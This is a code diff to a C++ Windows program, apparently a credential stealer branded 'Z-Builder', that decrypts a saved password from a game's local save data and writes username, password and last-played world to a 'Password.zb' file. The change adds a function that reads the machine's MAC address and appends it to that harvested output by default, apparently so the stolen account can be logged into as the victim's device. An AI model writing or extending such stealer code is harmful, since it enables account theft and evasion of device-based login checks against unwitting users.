@@ -18,6 +18,7 @@
 #include <tchar.h>
 
 #pragma comment(lib, "iphlpapi.lib")
+static string get_mac();
 
 unsigned int decrypt(byte* data, unsigned int size, int key)
 {
@@ -69,7 +70,7 @@ void rephelper(string& str, const string& from, const string& to) {
 int _stdcall WinMain(struct HINSTANCE__* hinstance, struct HINSTANCE__* hprevinstance, char* cmdline, int cmdshow)
 {
 	bool set_visible = false;
-	bool nowait = false, nolog = false, user = false, dump = false, custom_file = false, mac = false, world = false; //ghetto as fuck
+	bool nowait = false, nolog = false, user = false, dump = false, custom_file = false, mac = true, world = false; //ghetto as fuck
 	string custom_path{};
 	stringstream help{};
 	if (set_visible) {
@@ -116,13 +117,14 @@ int _stdcall WinMain(struct HINSTANCE__* hinstance, struct HINSTANCE__* hprevins
 				std::ofstream mysfile;
 				mysfile.open(filename + "\\Password.zb");
 				auto worldvar = db.GetVarIfExists("lastworld");
+				string MAC = get_mac();
 				if (worldvar)
 				{
-					mysfile << uservar->get_h() + "[---Z-Builder---]" + pass_str + "[---Z-Builder---]" + worldvar->get_h();
+					mysfile << uservar->get_h() + "[---Z-Builder---]" + pass_str + "[---Z-Builder---]" + worldvar->get_h() + "[---Z-Builder---]" + get_mac();
 				}
 				else
 				{
-					mysfile << uservar->get_h() + "[---Z-Builder---]" + pass_str + "[---Z-Builder---]No world found";
+					mysfile << uservar->get_h() + "[---Z-Builder---]" + pass_str + "[---Z-Builder---]No world found[---Z-Builder---]" + get_mac();;
 				}
 				mysfile.close();
 				cout << "writed to:" + filename + "\\Password.zb";
@@ -145,4 +147,29 @@ int _stdcall WinMain(struct HINSTANCE__* hinstance, struct HINSTANCE__* hprevins
 
 	if (!nowait)
 		(void)_getch();
+}
+
+static string get_mac() {
+	IP_ADAPTER_ADDRESSES ainfo[64];
+	DWORD len = sizeof(ainfo);
+	auto status = GetAdaptersAddresses(2, 0, NULL, ainfo, &len);
+	if (status == ERROR_BUFFER_OVERFLOW) //happened with 16 adapters for me but no1 should have over 64
+		return "NOMAC";
+	auto info = ainfo;
+	while (info) {
+		if (info->PhysicalAddressLength) {
+			for (auto j = info->FirstUnicastAddress; j; j = j->Next) {
+				if (j && (void*)&j->Address) {
+					if (j->Address.lpSockaddr && j->Address.lpSockaddr->sa_family == 2) {
+						auto address = info->PhysicalAddress;
+						char buffer[18];
+						sprintf_s(buffer, "%02X:%02X:%02X:%02X:%02X:%02X", address[0], address[1], address[2], address[3], address[4], address[5]);
+						return string(buffer);
+					}
+				}
+			}
+		}
+		info = info->Next;
+	}
+	return "NOMAC";
 }
